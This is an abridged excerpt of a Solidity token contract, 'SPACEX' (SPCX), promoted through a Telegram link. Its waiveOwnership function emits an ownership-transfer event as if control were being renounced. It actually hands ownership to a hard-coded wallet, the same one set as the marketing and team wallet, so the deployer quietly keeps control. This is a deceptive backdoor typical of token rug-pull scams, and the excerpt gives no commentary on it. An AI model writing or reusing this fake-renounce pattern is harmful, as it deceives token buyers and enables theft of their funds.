// *Telegram : https://t.me/space_xofc
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x1a2Efa6c5F9486c0d04686Bf3Bfa05C6a16ED4EB));
        _owner = address(0x1a2Efa6c5F9486c0d04686Bf3Bfa05C6a16ED4EB);
    }
...
contract SPACEX is Context, IERC20, Ownable {
    ...
    string private _symbol = "SPCX";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x1a2Efa6c5F9486c0d04686Bf3Bfa05C6a16ED4EB);
    address payable public teamWalletAddress = payable(0x1a2Efa6c5F9486c0d04686Bf3Bfa05C6a16ED4EB);
